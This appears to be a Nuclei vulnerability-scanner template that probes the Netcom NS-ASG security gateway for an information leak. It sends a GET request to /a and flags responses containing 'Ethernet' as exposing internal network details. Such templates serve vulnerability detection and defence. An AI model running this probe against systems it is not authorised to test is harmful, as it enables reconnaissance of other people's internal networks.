id: NSASG-Safety-Gateway-a-info
info:
  name: NSASG-Safety-Gateway-a-info
  author: apple
  severity: info
  description: Netcom NS-ASG应用程序的安全网关存在文件泄漏，服务器的内部网络信息被泄露
  reference:
    - https://github.com/flyyue2001/cve/blob/main/NS-ASG-info-leakage.md
  tags: tags
http:
  - raw:
      - |
        GET /a HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Te: trailers
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0
    matchers:
      - type: word
        part: body
        words:
          - Ethernet
